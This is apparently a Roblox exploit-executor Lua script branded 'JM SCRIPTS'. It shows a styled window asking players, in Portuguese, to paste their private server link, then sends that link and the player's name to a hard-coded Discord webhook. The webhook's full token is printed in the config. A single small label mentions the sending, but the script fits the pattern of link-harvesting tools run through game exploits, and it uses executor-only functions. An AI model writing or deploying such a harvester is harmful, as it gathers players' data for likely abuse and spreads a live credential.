--========================
-- CONFIG
--========================
local WEBHOOK_URL = "https://discord.com/api/webhooks/1468274684557529118/zJwKaKc2q7yb8tCs2XdZSYGuciAlRqX-3sVTro8RMEfwR2Tl1tSUf_-MHMiPVvJxlt17"
local DISCORD_INVITE = "https://discord.gg/ZPz8Renfz"

--========================
-- SERVICES
--========================
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local HttpService = game:GetService("HttpService")
local player = Players.LocalPlayer

--========================
-- WEBHOOK SEND
--========================
local function sendWebhook(text)
    local req = syn and syn.request or http_request
    if not req then return end

    req({
        Url = WEBHOOK_URL,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode({
            content = text
        })
    })
end

--========================
-- GUI
--========================
local gui = Instance.new("ScreenGui")
gui.IgnoreGuiInset = true
gui.Parent = game.CoreGui

local main = Instance.new("Frame", gui)
main.Size = UDim2.fromScale(0.45,0.5)
main.Position = UDim2.fromScale(0.5,0.5)
main.AnchorPoint = Vector2.new(0.5,0.5)
main.BackgroundColor3 = Color3.fromRGB(5,5,10)
main.BackgroundTransparency = 1

Instance.new("UICorner", main).CornerRadius = UDim.new(0,20)

local stroke = Instance.new("UIStroke", main)
stroke.Color = Color3.fromRGB(170,90,255)
stroke.Thickness = 2

-- BRILHO
local gradient = Instance.new("UIGradient", main)
gradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Color3.fromRGB(255,255,255)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(120,60,200))
}

-- ANIMAÇÃO DE ENTRADA
TweenService:Create(
    main,
    TweenInfo.new(0.6, Enum.EasingStyle.Quint, Enum.EasingDirection.Out),
    {BackgroundTransparency = 0}
):Play()

--========================
-- TÍTULO
--========================
local title = Instance.new("TextLabel", main)
title.Size = UDim2.fromScale(1,0.18)
title.BackgroundTransparency = 1
title.Text = "JM SCRIPTS"
title.Font = Enum.Font.GothamBlack
title.TextScaled = true
title.TextColor3 = Color3.fromRGB(190,120,255)

--========================
-- INPUT
--========================
local box = Instance.new("TextBox", main)
box.Size = UDim2.fromScale(0.9,0.14)
box.Position = UDim2.fromScale(0.05,0.25)
box.PlaceholderText = "Cole aqui o link do seu server privado"
box.Text = ""
box.Font = Enum.Font.Gotham
box.TextScaled = true
box.BackgroundColor3 = Color3.fromRGB(15,15,25)
box.TextColor3 = Color3.fromRGB(255,255,255)

Instance.new("UICorner", box).CornerRadius = UDim.new(0,14)
Instance.new("UIStroke", box).Color = Color3.fromRGB(140,80,220)

--========================
-- AVISO
--========================
local warn = Instance.new("TextLabel", main)
warn.Size = UDim2.fromScale(0.9,0.12)
warn.Position = UDim2.fromScale(0.05,0.41)
warn.BackgroundTransparency = 1
warn.TextWrapped = true
warn.TextScaled = true
warn.Font = Enum.Font.Gotham
warn.TextColor3 = Color3.fromRGB(200,200,200)
warn.Text = "⚠️ Ao enviar, você concorda que esse link será enviado para a equipe JM Scripts."

--========================
-- BOTÃO ENVIAR
--========================
local send = Instance.new("TextButton", main)
send.Size = UDim2.fromScale(0.4,0.14)
send.Position = UDim2.fromScale(0.05,0.58)
send.Text = "Enviar"
send.Font = Enum.Font.GothamBold
send.TextScaled = true
send.BackgroundColor3 = Color3.fromRGB(120,60,200)
send.TextColor3 = Color3.fromRGB(255,255,255)

Instance.new("UICorner", send).CornerRadius = UDim.new(0,16)

send.MouseButton1Click:Connect(function()
    if box.Text == "" then return end
    sendWebhook(
        "🔗 **Server Privado Enviado**\n" ..
        "👤 Player: "..player.Name.."\n" ..
        "📎 Link: "..box.Text
    )
    send.Text = "Enviado ✔"
end)

--========================
-- BOTÃO DISCORD
--========================
local discord = Instance.new("TextButton", main)
discord.Size = UDim2.fromScale(0.4,0.14)
discord.Position = UDim2.fromScale(0.55,0.58)
discord.Text = "Discord"
discord.Font = Enum.Font.GothamBold
discord.TextScaled = true
discord.BackgroundColor3 = Color3.fromRGB(90,90,255)
discord.TextColor3 = Color3.fromRGB(255,255,255)

Instance.new("UICorner", discord).CornerRadius = UDim.new(0,16)

discord.MouseButton1Click:Connect(function()
    setclipboard(DISCORD_INVITE)
end)
